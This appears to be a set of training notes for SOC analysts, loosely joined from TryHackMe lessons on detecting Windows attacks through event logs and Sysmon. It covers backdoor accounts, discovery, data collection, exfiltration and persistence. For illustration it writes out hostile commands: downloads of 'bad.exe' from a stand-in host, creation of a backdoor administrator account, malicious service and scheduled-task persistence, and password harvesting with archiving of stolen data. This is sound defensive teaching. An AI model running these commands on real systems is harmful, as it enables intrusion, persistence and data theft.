Below is a breakdown of the common event IDs you can use:

|**Event ID**|**Description**|**Malicious Usage**|
|---|---|---|
|**4720** / **4722** / **4738**|A user account was  <br>created / enabled / changed|Attackers might create a backdoor account or even enable an old one to avoid detection|
|**4725** / **4726**|A user account was  <br>disabled / deleted|In some advanced cases, threat actors may disable privileged SOC accounts to slow down their actions|
|**4723** / **4724**|A user changed their password /  <br>User's password was reset|Given enough permissions, threat actors might reset the password and then access the required user|
|**4732** / **4733**|A user was added to /  <br>removed from a security group|Attackers often add their backdoor accounts to privileged groups like "[Administrators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#administrators)"|
**Hunt for Backdoored Users (Expand Me)**

1. Open Security logs and filter for **4720** / **4732** event IDs
2. Manually review every event; your red flags are:
    - No one from your IT department can confirm the action
    - Changes were made during non-working hours or on weekends
    - The subject user's name is unknown or unexpected to you  
        (e.g. "**adm.old.2008**" creating new Windows users)
    - The target user's name does not follow a usual naming pattern  
        (e.g. "**backup**" instead of "**thm_svc_backup**")
3. If you confirmed that the action was malicious, find out the login details:
    - Copy the **Logon ID** field from your **4720** / **4732** event
    - Find the corresponding login event with the same Logon ID
    - Refer to the workbooks from the previous task for further analysis

process monitoring comes in handy, and there are two ways to enable it on Windows:

| **Event Code**                                 | **Purpose**                                                                                              | **Limitations**                                                                                                                                                                                              |
| ---------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **4688  <br>**(Security Log: Process Creation) | Log an event every time a new process is launched, including its command line and parent process details | Disabled by default, you need to enable it by following the [official documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing) |
| **1  <br>**(Sysmon: Process Creation)          | Replace 4688 event code and provide more advanced fields like process hash and its signature             | Sysmon is an external tool not installed by default. Check out the [Sysmon official page](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)                                                   |
Sysmon is a free tool from the Microsoft Sysinternals suite that became a de facto standard for advanced monitoring in addition to the default system logs. 

| Discovery Purpose                                                                                    | Common CMD / PowerShell Commands                                                          |
| ---------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| **Files and Folders**  <br>(To find out the host purpose, victim's job, or their interests)          | `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>`             |
| **Users and Groups**  <br>(To find out who uses the host and with which privileges)                  | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`                     |
| **System and Apps**  <br>(To find out vulnerabilities or apps to steal data from)                    | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service`               |
| **Network Settings**  <br>(To find out if the host belongs to a corporate network)                   | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`                     |
| **Active Antivirus**  <br>(To find out how risky it is to continue the attack without being blocked) | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |
Process Tree forGUIDiscovery

```sql
C:\Windows\System32\explorer.exe
├── C:\Windows\System32\cmd.exe                                   // Attacker can still use CMD!
│   └── ...
├── C:\Windows\system32\mmc.exe C:\Windows\system32\compmgmt.msc  // Open Computer Management
├── C:\Windows\system32\control.exe netconnections                // List network adapters
├── C:\Windows\ImmersiveControlPanel\SystemSettings.exe [...]     // Access settings panel
├── C:\Windows\system32\notepad.exe C:\...\secrets.txt            // Read a text file
└── C:\Windows\system32\taskmgr.exe                               // Run Task Manager
```

Data collection can be performed automatically via scripts or manually by human threat actors. For scripts, the whole process usually takes less than a minute, but it may take hours for the attacker to find and review the interesting files. Still, both methods should eventually end with exfiltration - uploading stolen data to a controller server. Here, threat actors can be very creative - to avoid detection, they often:

- Exfiltrate stolen data to DropBox, Mega, Amazon S3, or other trusted cloud storage services ([Examples](https://attack.mitre.org/techniques/T1567/002/#:~:text=Procedure%20Examples))
- Exfiltrate stolen data to known code repositories like GitHub or messengers like Telegram ([Example](https://cyberint.com/blog/research/the-new-infostealer-in-town-the-continental-stealer/#:~:text=offers%20a%20Telegram%20bot%20notification%20feature%20that%20informs%20users))
- Or just create a trustworthy-looking domain like "windows-updates.com" and send the data there
in Collection, threat actors don't just check a system configuration but rather look for specific files and folders shown in the previous task. Thus, you can detect access to the files by tracking commands like:

| Command Example                                                        | Description                                                                     |
| ---------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv`                | Threat actors used Notepad to check content of the interesting file             |
| CMD: `type debug-logs.txt \| findstr password > C:\Temp\passwords.txt` | Threat actors searched for the "password" keyword in a specific file            |
| PowerShell: `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf`     | Threat actors searched for PDF files in the user's home folder                  |
| PowerShell: `copy C:\Users\<user>\AppData\Roaming\Signal С:\Temp\`     | Threat actors copied Signal chat history to the Temp directory                  |
| PowerShell: `Compress-Archive С:\Temp\ С:\Temp\stolen_data.zip`        | Threat actors archived the stolen data, preparing for exfiltration              |
| `7za.exe a -tzip C:\Temp\stolen_data.zip С:\\Temp\\*.*`                | Alternatively, threat actors can use the existing archiving software like 7-Zip |
For example, Gremlin data stealer, a single malicious file, steals VPN profiles, cryptocurrency wallets, web browser sessions, Steam, Discord, and Telegram data, and even takes screenshots of the victim's host. You can read the details in [this Unit42 blog post](https://unit42.paloaltonetworks.com/new-malware-gremlin-stealer-for-sale-on-telegram/). Note that data stealers rarely use CMD or PowerShell commands but rely on their own code, making it harder to understand which exact data was accessed or stolen:

attacks start: not from a fully functional malware, but from a tiny phishing attachment or from an RDP session without any red team tools. Thus, at some attack stages, threat actors may need to download more tools to achieve their goals, for example:

- A script to automate Discovery and find common vulnerabilities like [Seatbelt](https://github.com/GhostPack/Seatbelt)
- A tool to extract saved passwords or OS credentials like [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- A fully functional Remote Access Trojan (RAT) like [Remcos RAT](https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/remcos-malware/)
- Finally, a ransomware binary to encrypt the system after the data is stolen
The process of downloading additional malware to the breached system is mapped to the MITRE [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) technique, and it is used in the majority of breaches.

| Ingress Tool Transfer Command                                                                                            | Common CMD / PowerShell Commands                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------- |
| Via Certutil                                                                                                             | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`                           |
| Via Curl (Windows 10+)                                                                                                   | `curl.exe https://blackhat.thm/bad.exe -o good.exe`                                         |
| Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
| Via Graphical Interface                                                                                                  | No need to use CMD, just copy-paste malware via RDP or download them via a web browser!     |
## Attacks Without C2

In some cases, C2 is not needed at all. For example, threat actors can type their commands directly in the RDP session after an RDP breach. Since this method becomes unavailable as soon as RDP is closed or secured, most threat actors choose to still set up a C2 immediately after the breach.

![An attacker breaching a server via RDP, accessing it as a normal user, and using GUI tools like Computer Management to view system information and continue the attack](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1751662007366.png)

Open terminal shortcuts:
Win + R, then type cmd
or
Win + X, then A

Let's focus on the second method now and see how you or threat actors can manage users on Windows. The first option is to use the graphical utility by searching for "Computer Management" or by launching `lusrmgr.msc`. The second option is to use a command line, like in the example below:

CMD andPowerShellCommands to Manage Users

```powershell
# 1. Two methods to create the "mr.backd00r" user
CMD C:\> net user "mr.backd00r" "p@ssw0rd!" /add
PS  C:\> New-LocalUser "mr.backd00r" -Password [...]

# 2. Two methods to add the user to Administrators 
CMD C:\> net localgroup Administrators "mr.backd00r" /add
PS  C:\> Add-LocalGroupMember "Administrators" -Member "mr.backd00r"
```
Every user creation event is logged as Security event ID **4720**
you should not rely just on detecting suspicious names like "hacker" but rather investigate:

1. **Who** created the account? Can the person confirm the account creation?
2. **What** is the source IP and time of the creator's login? Is it expected?
3. **Which** other suspicious events can you see in the creator's session?

## Services and Tasks

Unfortunately for defenders, there are literally a hundred or more methods to persist on a Windows machine. As a SOC L1 or L2 analyst, you don't need to know all of them, but let's start with the two common ones:

| Persistence Method                                    | Attack Example                                                               | Event ID Logging                                                                                 |
| ----------------------------------------------------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| Create a Windows Service  <br>(Runs after OS startup) | `sc create "BadService" binpath= "C:\malware.exe" start= auto`               | **Launch of sc.exe:** Sysmon / **1**  <br>**Service creation:** Security / **4697  <br>**        |
| Create a Scheduled Task  <br>(Run after OS startup)   | `schtasks /create /tn "BadTask" /tr "C:\malware.exe" /sc onstart /ru System` | **Launch of schtasks.exe:** Sysmon / **1**  <br>**Scheduled task creation:** Security / **4698** |
Many critical Windows components like DNS client or Security Center are services. You can view services by launching **services.msc** or searching for "Services", but you need administrative privileges and the **sc.exe** command to create or modify one.
In logs, you can detect malicious services in three ways:

1. Detect the launch of the `sc.exe create` command via Sysmon event ID **1**
2. Detect service creation via Security event ID **4697** or System event ID [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html)
3. Detect suspicious processes with a `services.exe` parent process

## Detecting Startup

The startup folder was meant to be an easy way for inexperienced users to configure programs to run on login. You simply open the startup folder, move your program or program shortcut there, and see how it automatically starts upon your future logins. You can access your startup folder via the path below:

```plaintext
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
Or for all users: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

## Detecting Run Keys

Run key persistence is very similar to the startup folder; they even share a single MITRE [technique](https://attack.mitre.org/techniques/T1547/001/)! The only major difference is how the entries are added there. Instead of just copying the program to the startup folder, you need to create a new value in the "Run" Windows registry and put the path to your program there:

```plaintext
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOr for all users: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
```

To view the "Run" entries, you can launch the `regedit.exe` or search for "Registry Editor" and go to the path shown above. To detect the malicious entry from logs, you can monitor registry change events (Sysmon Event ID **13**) affecting the Run keys:

![Three panels showing event ID 13 fields, process tree of the run key persistence, and malware appearance in registry Run key](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1751656467821.svg)